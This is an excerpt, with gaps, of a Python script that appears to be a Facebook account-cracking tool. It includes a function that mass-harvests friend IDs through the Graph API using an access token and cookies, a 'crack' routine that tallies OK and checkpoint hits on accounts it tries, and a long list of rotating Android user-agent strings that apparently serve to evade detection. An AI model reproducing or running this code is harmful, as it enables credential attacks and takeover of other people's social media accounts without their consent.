...
def menu(my_name,my_id):
  ...
  cetak(nel('\tWellcome [yellow]%s[white] Ganteng/Cantik'%(my_name)))
...
def dump_massal():
  ...
  for userr in uid:
    try:
      col = ses.get('https://graph.facebook.com/v15.0/'+userr+'?fields=friends.limit(5000){id,name}&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
...
def crack(idf,pwv):
  ...
  fff = 'ㅤ'
  sys.stdout.write('\r%s ㅤ %s»%s ㅤ OK:%s ㅤ CP:%s ㅤ %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
...
'Mozilla/5.0 (Linux; U; Android 9;  en-us; GT-G768A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.4456.115 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',
...
'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; en-au; SCV45) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',
...
'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A530F/A530FXXU4CSC6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-T835) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36',
